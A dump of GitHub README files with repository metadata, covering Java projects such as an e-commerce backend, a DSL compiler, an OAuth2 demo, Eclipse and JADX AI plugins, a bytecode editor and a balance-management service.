‚îÇ   ‚îú‚îÄ‚îÄ repository/            # Data Access Layer
‚îÇ   ‚îú‚îÄ‚îÄ config/                # Configuration files
‚îÇ   ‚îú‚îÄ‚îÄ exception/             # Custom Exceptions
‚îÇ   ‚îî‚îÄ‚îÄ dto/                   # Data Transfer Objects (DTO)
‚îú‚îÄ‚îÄ src/main/resources
‚îÇ   ‚îú‚îÄ‚îÄ application.yml        # Spring Boot Configuration
‚îú‚îÄ‚îÄ Dockerfile
‚îú‚îÄ‚îÄ docker-compose.yml
‚îú‚îÄ‚îÄ pom.xml                    # Maven Dependencies
‚îî‚îÄ‚îÄ README.md
```

## Project Structure DDD


```
.
‚îú‚îÄ‚îÄ MEMBER.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ mvnw
‚îú‚îÄ‚îÄ mvnw.cmd
‚îú‚îÄ‚îÄ myshop-framework
‚îÇ   ‚îî‚îÄ‚îÄ pom.xml
‚îú‚îÄ‚îÄ myshop-module-buyer
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ BuyerApplicationApi.java
‚îú‚îÄ‚îÄ myshop-module-manager
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ ManagerApplicationApi.java
‚îú‚îÄ‚îÄ myshop-module-store
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ StoreApplicationApi.java
‚îî‚îÄ‚îÄ pom.xml
```

## Task Checklist

### User Management
- [ ] User Registration (Sign-up)
- [ ] User Authentication (Login/Logout)
- [ ] Implement JWT Token for Authentication
- [ ] Password Reset and Update
- [ ] Two-factor Authentication (2FA)
- [ ] Profile Management (Edit Profile, Upload Avatar)

### Product Management
- [ ] Create Product
- [ ] Update Product Details
- [ ] Delete Product
- [ ] Implement Search and Filter by Category
- [ ] Add Product Reviews and Ratings

### Order Management
- [ ] Create New Order
- [ ] Update Order Status (Processing, Shipped, Delivered, etc.)
- [ ] Cancel Order
- [ ] Integrate with Payment Gateway (Stripe/PayPal)
- [ ] Track Order Status and Delivery

### Cart and Wishlist
- [ ] Add to Cart
- [ ] View Cart and Checkout
- [ ] Add to Wishlist
- [ ] Remove from Cart/Wishlist

### Inventory Management
- [ ] Track Stock Levels for Products
- [ ] Handle Out-of-Stock Situations
- [ ] Implement Inventory Notification (Low Stock)

### Shipping and Delivery
- [ ] Integrate with Shipping APIs (FedEx/DHL)
- [ ] Provide Real-time Shipping Rates
- [ ] Implement Order Dispatch and Delivery Tracking

### Payments
- [ ] Integrate Stripe Payment
- [ ] Integrate PayPal Payment
- [ ] Handle Refunds and Returns
- [ ] Support Multiple Payment Methods

### Notifications
- [ ] Email Notifications for Order Confirmation
- [ ] SMS Notifications for Shipping Updates
- [ ] Push Notifications

### Admin Dashboard
- [ ] Manage Users
- [ ] Manage Products
- [ ] Manage Orders
- [ ] View Analytics (Sales, Revenue)

### Testing
- [ ] Write Unit Tests (Junit, Mockito)
- [ ] Write Integration Tests

## Contribution Guidelines

We welcome contributions! Please see our [CONTRIBUTING.md](./MEMBER.md) for details on the process for submitting pull requests.

### Getting Started

1. **Clone the Repository**: 
   ```bash
   git clone https://github.com/anonystick/JAVA-ecommerce-backend-api-MEMBER
   cd JAVA-ecommerce-backend-api-MEMBER
   ```

2. **Build the Project**:
   ```bash
   mvn clean install
   ```

3. **Run with Docker**:
   ```bash
   docker-compose up
   ```

4. **Access the API Documentation**:
   Once the server is running, go to: `http://localhost:9966/swagger-ui/`

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",0,0,1,,0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
VarunReddyT/Pre-FS,main,"SVM PreFs | KMIT | 30th December 2024 Class | Neil Gogte Sir's
Video Link:
https://youtu.be/8gcTW4DGSHs?si=dt5Ww_giBSScPMB2
",0,0,2,,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
vishalkrishnaagQwy/VipLang,master,"# Virtual Interfacing Programming Language (VIPL)

VIPL (Virtual Interfacing Programming Language) is a domain-specific language (DSL) with a syntax similar to Python, designed for flexible and intuitive virtual interfacing. VIPL offers a streamlined syntax and Python-like functionality, making it approachable for those familiar with Python while providing features specific to interfacing tasks. The VIPL compiler is implemented in Java, ensuring performance and portability.

## Features

- **Python-like Syntax**: Easy-to-read and concise, VIPL offers familiar Python syntax, making it accessible to Python developers.
- **Domain-Specific Language**: Focused on virtual interfacing, VIPL is optimized for tasks such as resource management, interfacing, and more.
- **Java-based Compiler**: VIPL's compiler is built in Java, providing cross-platform support and reliable performance.
- **Dynamic Typing and Interfacing Features**: Supports complex expressions, object-oriented programming, and flexible interfacing capabilities.
- **Indentation-based Structure**: Like Python, VIPL relies on indentation for code blocks, making it clean and visually intuitive.

## Getting Started

### Prerequisites

To build and run VIPL, ensure you have the following installed:

- **Java JDK** (version 11 or higher)
- **Git** (for version control)
- **IDE** (optional, but recommended for development)

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/vishalkrishnaagQwy/VipLang/
   cd VipLang
   ```

2. Build the project:
   ```bash
   javac -d bin src/*.java
   ```

3. Run the VIPL compiler:
   ```bash
   java -cp bin Main
   ```

### Examples

#### 1. Hello World

A simple program to display ""Hello, World!"" in VIPL:

```python
print(""Hello, World!"")
```

#### 2. Variables and Data Types

VIPL supports dynamic typing. Here‚Äôs how you can define and print variables:

```groovy
var message = ""Welcome to VIPL""
var count = 42
var pi = 3.14
var is_active = true

print(message)
print(""Count is"", count)
print(""Value of pi:"", pi)
print(""Is active?"", is_active)
```

#### 3. Functions

Define and call functions in VIPL similarly to Python:

```groovy
def greet(var name)
    print(""Hello, "" + name)

greet(""Alice"")
```

#### 4. Control Flow

VIPL includes basic control flow statements like `if`, `else`, and `while`.

```groovy
var age = 18

if age >= 18
    print(""You are eligible to vote."")
else
    print(""You are not eligible to vote."")
```

#### 5. Loops

VIPL supports loops with `for` and `while`. Here‚Äôs an example of both:

```groovy
# While loop
var count = 0
while count < 5
    print(""Count is"", count)
    count += 1

# For loop
for i in range(5)
    print(""Iteration:"", i)
```

#### 6. Object-Oriented Programming

VIPL supports object-oriented programming. Here‚Äôs an example of defining a simple class:

```python
class Person
    def Person(name, age)
        this.name = name
        this.age = age

    def introduce()
        print(""Hi, I am "" + this.name + "" and I am "" + str(this.age) + "" years old."")

# Create an instance of the Person class
p = Person(""Alice"", 30)
p.introduce()
```

### Running VIPL Programs

To run a VIPL program, save your code in a `.vipl` file and pass it to the VIPL compiler:

```bash
java -cp bin Main path/to/your_file.vp
```

## Contributing

VIPL is in the beta stage, and contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix:
   ```bash
   git checkout -b feature-or-fix-name
   ```
3. Commit your changes and push into your branch.
4. Open a pull request and describe your changes.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

Special thanks to everyone who contributed to making VIPL a reality. This project aims to simplify virtual interfacing with an accessible syntax and powerful features.
```

This template now includes examples covering variables, functions, control flow, loops, and object-oriented programming in VIPL, providing a comprehensive guide for new users. Adjust as needed based on specific VIPL features.
",1,0,2,,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
KevenJAntenor/Quebec-Centralized-Medical-Record-System,main,"# Dossier M√©dical Centralis√© Qu√©bec (Quebec Centralized Medical Record System)

## Project Overview

This project aims to develop a centralized medical record system for the Quebec healthcare system. The software will allow users of the Quebec health system to have a centralized medical record, regardless of the doctor or healthcare facility they visit.

## Context

Currently, each doctor's office and hospital maintains its own patient records. In most cases, these records are never shared, preventing doctors from having a comprehensive view of a patient's health status. This system is designed to address this problem by centralizing patient medical records.

## Key Features

- Centralized patient medical records
- Access for healthcare providers to a patient's complete medical history
- Record of patient visits across different healthcare facilities
- Comprehensive view of known diagnoses
- Information on other doctors treating the patient

## Benefits

- Improved continuity of care
- Enhanced decision-making for healthcare providers
- Reduced redundancy in medical tests and procedures
- Better coordination among different healthcare providers

",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,14.0
NisenoShitsu/HololiveDesktop,main,"# HololiveDesktop
Hololive Members inside your computer doing their stuff while you are working or doing your computer stuff =w=
==============================================
HOLOLIVEDESKTOP PET or Shimeji-ee by Niseno Shitsu
==============================================

HOW TO USE:
-----------------------------------
- Make sure Java is already installed.
- EXTRACT CONTENTS OF THIS ARCHIVE TO A FOLDER.
- Simply run Shimeji-ee.jar, Shimeji-ee.exe or Shimeji-ee.bat
- To look for options, Right-click the black colored hololive play icon as shown in the screenshots below in taskbar sytem stray
- You can enable/disable certain begaviors of each Hololive Talents or Choose and Summon one of them Hololive Members to your computer

-----------------------------------
SCREENSHOTS:
-----------------------------------
<img src=""https://i.imgur.com/gkfcNGY.png"" alt=""HololiveDesktop Myth"" width=""1000"">

-----------------------------------
WHERE TO DOWNLOAD?:
-----------------------------------
- Click on the ""Releases"" on the ""About"" section of this page located at the right side 
- Follow the instructions inside the ""Releases"" Page

-----------------------------------
SUPPORT THIS PROJECT BY
-----------------------------------
If you want to support me in making this project I will be glad to and very thankful so feel free to join me in my [Patreon] https://www.patreon.com/nisenoshitsu?utm_campaign=creatorshare_creator!
Or You can Donate On my [Ko-Fi] https://ko-fi.com/niseno_shitsu

ENJOY HOLOLIVE FANS!
",1,3,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
danvega/golf-scheduler,main,"# Golf Academy OAuth2 Implementation

A robust OAuth2 implementation for the Golf Academy application using Spring Boot 3.3+. This project demonstrates a complete OAuth2 setup with an authorization server, resource server, and client applications.

In particular this application is showing off the new RestClient support for OAuth2 in Spring Security 6.4. 

https://spring.io/blog/2024/10/28/restclient-support-for-oauth2-in-spring-security-6-4

## Project Overview

The project consists of three main components:

1. **Authorization Server** (Port 9000) - Handles authentication and issues OAuth2 tokens
2. **Resource Server** (Port 8081) - Provides protected golf lesson endpoints
3. **Client Applications**:
    - OAuth2 Client (Spring Security implementation)
    - No-Auth Client (RestClient without Authorization)

## Architecture

```mermaid
graph TD
    A[Client Application] -->|OAuth2 Token Request| B[Authorization Server]
    B -->|Issues Token| A
    A -->|Request with Token| C[Resource Server]
    C -->|Validates Token with| B
    C -->|Returns Protected Resources| A
```

## Project Requirements

- Java 23
- Spring Boot 3.3.5+
- Maven 3.6+
- Spring Security 6.4+

## Key Features

- OAuth2 Authorization Server implementation
- JWT token-based authentication
- Resource server with protected endpoints
- Client credential flow implementation
- RestClient with OAuth2 support

## Getting Started

### Setting Up the Authorization Server

1. Start the authorization server:

```bash
cd authorization-server
./mvnw spring-boot:run
```

The server will start on port 9000 with the following configuration:

```yaml
spring:
  security:
    oauth2:
      authorizationserver:
        issuer: http://localhost:9000
```

### Setting Up the Resource Server

1. Start the resource server:

```bash
cd resource-server
./mvnw spring-boot:run
```

The resource server runs on port 8081 and is configured to validate tokens with the authorization server:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:9000
```

### Client Applications

#### OAuth2 Client Application

Configuration example:

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          golf-client:
            client-id: golf-client
            client-secret: golf-secret
            authorization-grant-type: client_credentials
            scope: read
```

#### Using the REST API

To access protected resources:

```java
@RestController
public class LessonsController {
    private final RestClient restClient;

    @GetMapping(""/lessons"")
    public String fetchLessons() {
        return restClient.get()
                .uri(""http://localhost:8081/lessons"")
                .attributes(clientRegistrationId(""golf-client""))
                .retrieve()
                .body(String.class);
    }
}
```

## Security Configuration

### Authorization Server

The authorization server is configured with in-memory client registration:

```java
@Bean
public RegisteredClientRepository registeredClientRepository() {
    RegisteredClient registeredClient = RegisteredClient.withId(UUID.randomUUID().toString())
            .clientId(""golf-client"")
            .clientSecret(passwordEncoder().encode(""golf-secret""))
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.CLIENT_CREDENTIALS)
            .scope(""read"")
            .build();
    return new InMemoryRegisteredClientRepository(registeredClient);
}
```

### Resource Server

The resource server is configured to require authentication for all requests:

```java
@Configuration
@EnableWebSecurity
public class ResourceServerConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(authorize -> authorize
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(Customizer.withDefaults())
            );
        return http.build();
    }
}
```

## API Endpoints

### Lessons API

`GET /lessons` - Retrieves available golf lessons

Example response:
```json
[
  {
    ""title"": ""Beginner Golf Basics"",
    ""description"": ""An introduction to the fundamentals of golf."",
    ""instructor"": ""John Doe"",
    ""schedule"": ""2024-11-05T10:00:00""
  }
]
```

## Testing

The project includes JUnit tests for each component. Run tests using:

```bash
./mvnw test
```

## Error Handling

The client applications include comprehensive error handling for OAuth2-related issues:

```java
.defaultStatusHandler(HttpStatusCode::is4xxClientError, (request, response) -> {
    if (response.getStatusCode() == HttpStatus.UNAUTHORIZED) {
        throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, 
            ""Unauthorized access to lessons API"");
    }
    throw new ResponseStatusException(response.getStatusCode(), 
        ""Client error occurred"");
})
```",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
The-Nefarious-Developer/zjoule,main,"<h1 align=""center"">
<img src=""assets/zjoule.png"" alt=""Intro GIF"" width=""25""/> zJoule - ABAP Copilot
</h1>

<div align=""center"">

[![Latest Test](https://github.com/The-Nefarious-Developer/zjoule/actions/workflows/main.yaml/badge.svg)](https://github.com/The-Nefarious-Developer/zjoule/actions/workflows/main.yaml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=The-Nefarious-Developer_zjoule&metric=alert_status&token=e2a58dc0706342532d8d14ae0badfe72fd08ff28)](https://sonarcloud.io/summary/new_code?id=The-Nefarious-Developer_zjoule) 
[![CodeQL](https://github.com/The-Nefarious-Developer/zjoule/actions/workflows/github-code-scanning/codeql/badge.svg)](https://github.com/The-Nefarious-Developer/zjoule/actions/workflows/github-code-scanning/codeql)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Javadoc](https://img.shields.io/badge/JavaDoc-Online-green)](https://zjoule.com/v1.1.2/doc/)
[![semantic-release: angular](https://img.shields.io/badge/semantic--release-angular-e10079?logo=semantic-release)](https://github.com/semantic-release/semantic-release)

</div>

**zJoule** is an Open Source AI assistant plugin for Eclipse designed to integrate Generative AI into your development environment.

## Documentation Content
- [Requirements](#requirements)
- [Compatibility](#compatibility)
- [Motivation](#motivation)
- [Getting Started](#getting-started)
- [Demo](#demo)
- [How to Contribute](#how-to-contribute)
- [References](#reference)
- [License](#license)

## Requirements
- A local **Ollama** installation or **SAP AI Core** with the `Extended` service plan (for the Generative AI Hub enablement).
- Eclipse 2024-09 (4.33.0) or latest. *Compatibility with older versions is not guaranteed.*

## Compatibility

The following table outlines the Generative AI models currently compatible with this plugin, as well as the next models that will soon be available.

> **Privacy Information** <br>
We know how privacy is important and ensure that all communication handled by the plugin is secure **is a must**. Here's how your data is managed:
> - **Data Flow:** All communication facilitated by the plugin occurs exclusively between Eclipse and the SAP AI Core model APIs. No external intermediaries are involved.
> - **Data Storage:** Any data processed or generated during plugin usage is stored locally within Eclipse's memory mechanism, ensuring it remains private and confined to your development environment. <br>
>
> By keeping all operations local and secure, the plugin should provide a trustworthy and seamless experience.

### Ollama

This plugin supports Ollama models through a local installation. For more information regarding the models available, please, check [this link]().

### SAP AI Core Generative AI Hub

| Executable ID | Model                          | Version                   | Compatibility      |
|---------------|--------------------------------|---------------------------|:------------------:|
| azure-openai  | `gpt-35-turbo`                 | 0613                      | :white_check_mark: |
| azure-openai  | `gpt-35-turbo`                 | 1106 (latest)             | :white_check_mark: |¬†
| azure-openai  | `gpt-35-turbo-16k`             | 0613 (latest)             | :white_check_mark: |
| azure-openai  | `gpt-4`                        | 0613                      | :white_check_mark: |
| azure-openai  | `gpt-4-32k`                    | 0613 (latest)             | :white_check_mark: |
| azure-openai  | `gpt-4o`                       | 2024-05-13                | :construction:     |
| azure-openai  | `gpt-4o`                       | 2024-08-06 (latest)       | :construction:     |
| azure-openai  | `gpt-4o-mini`                  | 2024-07-18                | :construction:     |
| azure-openai  | `gpt-4`                        | turbo-2024-04-09 (latest) | :construction:     |
| aws-bedrock   | `anthropic--claude-3-haiku`    | 1 (latest)                | :construction:     |
| aws-bedrock   | `anthropic--claude-3-sonnet`   | 1 (latest)                | :construction:     |
| aws-bedrock   | `anthropic--claude-3.5-sonnet` | 1                         | :construction:     |
| aws-bedrock   | `anthropic--claude-3.5-sonnet` | 2 (latest)                | :construction:     |

LLM models that are not compatible may be selected during the login process; however, their functionality cannot be guaranteed, and errors may occur.

Additional model compatibilities may be introduced in the near future :)

## Motivation

The official Joule version for ADT is being rolled out exclusively for S/4HANA Private Cloud and SAP BTP, ABAP Environment at the end of Q1 of 2025. But don‚Äôt worry, this plugin was created to bridges the gap! It introduces an AI-powered chat interface that seamlessly connects other types of SAP systems to large language models (LLMs) through different AI providers.

The idea is to open the door to integrate SAP ABAP development with new models and innovative features that could emerge from the expanding possibilities of AI. 

All from the cozy confines of your Eclipse ADT =)

### Benefits

#### 1. Coding Assistance:
- Answer coding-related questions.
- Provide real-time suggestions and explanations for code.
- Assist in debugging by analyzing error messages and suggesting fixes.
#### 2. Documentation & Learning:
- Summarize or explain code snippets and concepts.
- Fetch and clarify information on APIs, libraries, or frameworks.
#### 3. Productivity Boost:
- Reduce context switching by enabling developers to query information directly within Eclipse.
- Automate repetitive tasks through scripting and custom commands.
#### 4. Integration with SAP AI Core:
- Access advanced AI capabilities, potentially tailored to SAP-specific development workflows.
#### 5. Dynamic Testing Support:
- Offer insights into test cases or suggest ways to optimize testing processes.
#### 6. Natural Language Interaction:
- Simplify complex development tasks by allowing users to describe their needs in plain language.
#### 7. Enhanced Development Experience:
- Enable faster learning for beginners or new team members.
- Provide a smoother workflow for experienced developers needing quick solutions.
#### 8. Privacy and Security:
- If using a local Ollama installation, all data processing occurs entirely on your machine, without any internet dependency.
- This ensures maximum privacy, as sensitive code or project details never leave your local environment.

## Getting Started

1. Download and install **zJoule** in your Eclipse instance following the procedure described [right here](https://zjoule.com).

2. If the plugin view is not currently open in your Eclipse Editor, go to `Window > Show View > Other..` and search for **zJoule** inside the **ABAP Copilot** folder.

<div align=""center"">
  <img src=""assets/view.png"" alt=""Intro GIF"" width=""200""/>
</div>

3. Click on the authentication button (lock icon) at the top of the view and select the AI provider you want to work with.

<div align=""center"">
  <img src=""assets/login_0.png"" alt=""Intro GIF"" width=""400""/>
</div>

### Connecting to an Ollama local installation

4. Enter the localhost and port where your Ollama instance is available.

<div align=""center"">
  <img src=""assets/login_ollama_1.png"" alt=""Intro GIF"" width=""400""/>
</div>

5. Select the model you have installed and want to work with.

<div align=""center"">
  <img src=""assets/login_ollama_2.png"" alt=""Intro GIF"" width=""400""/>
</div>

### Connecting to an SAP AI Core instance

4. Login using your SAP AI Core `Service Key`.

<div align=""center"">
  <img src=""assets/login_sap_1.png"" alt=""Intro GIF"" width=""400""/>
</div>

You can find it in the *Instances an Subscriptions* area of your SAP BTP subaccount.

5. Select the `resource group` and the `deployment` model you want to use.

<div align=""center"">
  <img src=""assets/login_sap_2.png"" alt=""Intro GIF"" width=""400""/>
</div>

Resource Groups are essentially a project workspace in the context of SAP AI Core, and contains all components a specific ML or AI solution might use to attend a specific requirement. [More Information](https://help.sap.com/docs/sap-ai-core/sap-ai-core-service-guide/resource-groups?q=resource+groups).

Deployment is the component that will enable a LLM to be consumed. [More Information](https://help.sap.com/docs/sap-ai-core/sap-ai-core-service-guide/create-deployment-for-generative-ai-model-in-sap-ai-core).

## Demo

### Asking for code samples.

<div align=""center"">
  <img src=""assets/demo_sample.gif"" alt=""Intro GIF"" width=""200""/>
</div>

zJoule offers code snippets and on-the-go assistance, helping you learn or recall information without ever leaving your development environment.

### Requesting context information.

<div align=""center"">
  <img src=""assets/demo_context.gif"" alt=""Intro GIF"" width=""800""/>
</div>

When the user opens a new component, such as a class or a CDS view, zJoule will retrieve its content and include it as context for the user prompt. A small tag will appear above the input box, indicating the content being used as context.

### Clean up chat history.

<div align=""center"">
  <img src=""assets/demo_memory.gif"" alt=""Intro GIF"" width=""200""/>
</div>

As the chat progresses, additional information will be collected and shared with the AI assistant to enhance personalization. However, the user can clear the chat history at any time if the accumulated messages are no longer relevant to the conversation.

### Logout from the current SAP AI Core instance.

<div align=""center"">
  <img src=""assets/demo_logout.gif"" alt=""Intro GIF"" width=""200""/>
</div>

Logging out will erase the chat history and any login data used during the LLM communication process, enabling users to establish new connections entirely independent of previous interactions.

## How to Contribute

Contributions are welcome! Here's how you can get involved:

1. **Report Issues:** Found a bug or have a feature request? [Open an issue](https://github.com/The-Nefarious-Developer/zjoule/issues). <br />
2. **Submit Pull Requests:** Fork the repository, create a new branch, make your changes, and submit a PR. <br />
3. **Improve Documentation:** Help us improve the README or add examples to make setup easier. <br />
4. **Test & Feedback:** Try this Eclipse AI Assistant and give us feedback to improve them.

Please follow the [contribution guidelines](CONTRIBUTING.md) for more details.

## Reference

[SAP Note: 3437766 (Availability of Generative AI Models)](https://me.sap.com/notes/3437766)

[How this project consumes generative AI models.](https://help.sap.com/docs/sap-ai-core/sap-ai-core-service-guide/consume-generative-ai-models-using-sap-ai-core)

[The spinner ""Ellipsis"" is provided by loading.io](https://loading.io/icon/)

[zJoule - ABAP Copilot website repository](https://github.com/The-Nefarious-Developer/zjoule-website)

[zJoule - ABAP Copilot website](https://zjoule.com)

[Ollama API documentation](https://github.com/ollama/ollama/blob/main/docs/api.md)

[Ollama website](https://ollama.com)

## License
Copyright (c) 2024 Nicholas Coutinho Checan. <br />
Licensed under the MIT License. See [LICENSE](LICENSE).
",9,0,1,MIT,1,30.0,0.0,3.0,1.0,10.0,0.0,-2.65,210.0
samanL33T/jadx-xvision-plugin,main,"![](screenshots/name.png ""xVision Plugin"")

# jadX xVision Plugin

xVision is a plugin for the [JadX](https://github.com/skylot/jadx) decompiler that aims to integrate with Large Language Models (LLMs) to provide code analysis directly in the JAdX. This plugin allows you to analyze Java code for functionality, security issues, and notable patterns using LLMs like GPT-4, Claude or any custom local LLMs.

## Features

- **LLM Integration**: Supports GPT-4 & Claude-sonnet-3-5-20241022
- **Code Analysis**: Analyze Java code for functionality, security issues, and notable patterns.
- **Custom Prompts**: Configure custom prompts for analysis.
- **GUI Integration**: Integrates with JadX GUI for easy access.

## Screenshots

![](screenshots/xVision_config.png ""xVision Config"")
![](screenshots/xVision_Analyse_with_XVision.png ""COntext menu optin - Analyze with xVision"")
![](screenshots/xVision_prompt_Box.png ""xVision Analysis Prompt"")
![](screenshots/xVision_Analysis_with_updated_code_rendering.png ""xVision Analysis with code rendering"")
![](screenshots/xVision_Analysis.png ""xVision Analysis"")

## Installation

### Prerequisites

- JadX v1.5.0 or later (CLI or GUI)
- Java Development Kit (JDK) 11 or higher

### Download the jar file from releases

- [jadX-xVision Plugin v1.0.0](https://github.com/samanl33t/jadx-xvision-plugin/releases/download/v1.0.0/jadx-xvision-plugin_v1.0.0.jar)

### Build locally

1. **Clone the repository**:
    ```sh
    git clone https://github.com/samanl33t/jadx-xvision-plugin.git
    cd jadx-xvision-plugin
    ```

2. **Build the plugin**:
    ```sh
    ./gradlew clean build
    ```

3. **Install the plugin**:
    - For `jadx-cli`:
        ```sh
        jadx plugins --install-jar build/libs/jadx-xVision-plugin-dev.jar
        ```
    - For `jadx-gui`:
        - Open JadX GUI.
        - Go to **Plugins** > **Install plugin**.
        - Select the `jadx-xVision-plugin-dev.jar` file from the `build/libs` directory.

## Usage

### JadX GUI

1. **Open JadX GUI**.
2. **Load a supported package to analyze**.
3. **Click Menu -> 'Xvision Config'** - Select LLM to use and add **API Key**
4. **Right-click on a class or method** and select **Analyze with xVision Plugin**.

### Configuration

The Plugin options can be configured from Menu bar > Plugins > xVision Config.
Following configurations are available:

- **LLM Type** Select LLM to use
- **API Key** API Key for selected LLM
- **Custom Endpoint** API endpoint if you're using a custom LLM
- **Set Default Prompt**  Replace the default prompt with your own prompt for all further analysis.

### Custom Prompts

1. **Select a code block** in JadX GUI.
2. **Right-click** and choose **Analyze with xVision Plugin**.
3. **Check the Custom Prompt checkox** in the dialog that appears.
4. Enter the custom prompt to use.

>Note: The custom prompt will replace the default prompt


## Thanks
- [MartinKayJr](https://github.com/skylot/jadx/issues/1884#issue-1727047157) - for default prompt.
- [Devilx86](https://github.com/Devilx86/jadx-ai-view-plugin) - LLM response Code Rendering in a new window.
- bobbylight [RSyntaxTextArea](https://github.com/bobbylight/RSyntaxTextArea)


## Contributing

Contributions are welcome! Please open an issue or submit a pull request on GitHub.
",2,0,2,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
Liubsyy/VisualClassBytes,master,"## VisualClassBytes

IDEA plugin for Java class bytecode editor, based on
ASM and BCEL.


## Features
- Modify info of class, field, inner class and method.
- Edit method bytecode instructions, local variable table, exception table, and line number table.
- Modify constant pool.
- Support class file and class in JAR.


## Quick start

### 1. Install plugin from marketplace
First install the plugin JarEditor from marketplace, IDEA at least version **2020.3**

### 2. Open VisualClassBytes Editor 

Right click on class file -> Visual ClassBytes, you can open VisualClassBytes editor.

<img src=""./img/vcb_main.png"" width=""800"" height=""600"" />


### 3. Modify info

Then you can modify class ,field,inner class and method info etc.

<img src=""./img/edit_info.png"" width=""800"" height=""650"" />

### 4. Edit method bytecode instructions

Open the method node to modify the bytecode instructions.
<img src=""./img/edit_method.png"" width=""800"" height=""572"" />

You can also modify local variable,exception table,line number and etc.

### 5. Modify constant pool

Open the constant pool node to modify constant.

<img src=""./img/const_pool.png"" width=""600"" height=""488"" />
",1,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hungnm98/hermes,main,"# Hermes

Hermes is a high-performance project designed for managing account balances and frozen balances, focusing on synchronization and consistency in distributed environments. The system is built to handle user balance changes safely, preventing race conditions.

## Key Features

- **Balance and Freeze Balance Management**: Provides operations for managing account balances and frozen balances.
- **Ensures Synchronization in Distributed Environments**: Uses Redis locks and event sourcing to ensure that user balance changes are processed by a single thread at any given time.
- **Processes Operations from Kafka**: Hermes receives account operations from Kafka and applies them to the respective accounts.

## Performance Benchmarks

- **Environment**:
   - **Hardware**: MacBook M1 Pro with 32GB RAM
   - **Setup**:
      - 1 node Kafka
      - 1 node Redis
      - 1 node MongoDB
      - 8 node Hermes
      - 1 haproxy

```
wrk -t12 -c1024 -d30s --timeout 30s http://192.168.1.10:10030/tests/send-operation/stress-test
Running 30s test @ http://192.168.1.10:10030/tests/send-operation/stress-test
  12 threads and 1024 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency   391.06ms   30.24ms 472.26ms   80.87%
    Req/Sec   215.87     42.25   343.00     69.29%
  77416 requests in 30.10s, 15.58MB read
Requests/sec:   2571.94
Transfer/sec:    529.96KB

```

wrk -t12 -c400 -d15s --timeout 30s http://localhost:10020/tests/send-operation/test

## Architecture and Implementation

- **Redis Lock**: Ensures thread safety in a multi-threaded environment, preventing race conditions.
- **Event Sourcing**: Stores events of account changes to maintain a history and the current state of each account.
- **Kafka**: Serves as the source of account operations and distributes them to processing threads in the system.

## Installation Guide

### System Requirements

- Java 21
- Redis
- Kafka
- MongoDB

### Setup

1. **Clone the Project**:
   ```bash
   git clone https://github.com/username/hermes.git
   cd hermes
   ```

2. **Configure**: Update the configuration files to connect to Kafka, Redis, and MongoDB.

3. **Run the Project**:
   ```bash
   ./mvnw spring-boot:run
   ```

## Usage

Hermes will automatically listen for operations from Kafka and handle account transactions accordingly. All user balance changes are strictly managed to ensure safety in multi-threaded processing environments.

## Contributions

Contributions for performance improvements and feature enhancements are welcome. Please open a pull request or an issue to start contributing.

---

Let me know if there's anything else to add!
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
alibaba/fluss,main,"<p align=""center"">
  <img src=""website/static/img/banner.png"" />
</p>

<p align=""center"">
  <a href=""https://alibaba.github.io/fluss-docs/docs/intro/"">Documentation</a> | <a href=""https://alibaba.github.io/fluss-docs/docs/quickstart/flink/"">QuickStart</a> | <a href=""https://alibaba.github.io/fluss-docs/docs/dev/ide-setup/"">Development</a>
</p>

## What is Fluss?

Fluss is a streaming storage built for real-time analytics which can serve as the real-time data layer for Lakehouse architectures.

It bridges the gap between **data streaming** and **data Lakehouse** by enabling low-latency, high-throughput data ingestion and processing while seamlessly integrating with popular compute engines like **Apache Flink**, while Apache Spark, and StarRocks are coming soon.

**Fluss (German: river, pronounced `/flus/`)** enables streaming data continuously converging, distributing and flowing into lakes, like a river üåä

## Building

Prerequisites for building Fluss:

